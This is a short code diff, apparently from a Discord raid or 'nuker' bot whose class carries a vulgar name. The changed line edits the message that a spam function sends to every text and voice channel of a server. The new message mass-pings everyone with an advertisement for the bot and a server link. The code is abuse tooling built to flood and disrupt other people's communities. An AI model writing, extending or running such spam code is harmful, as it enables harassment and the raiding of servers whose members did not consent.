@@ -17,7 +17,7 @@ class Fucker:
     async def spam(self, ctx):
         spam_amount = 10
         urls = []
-        json = {"content": f"@everyone {LINKSERV}"}
+        json = {"content": f"@everyone BEST BOT?? TRY {NAME}\n{LINKSERV}"}
 
         channels = self.ctx.guild.text_channels + self.ctx.guild.voice_channels
         for channel in channels:
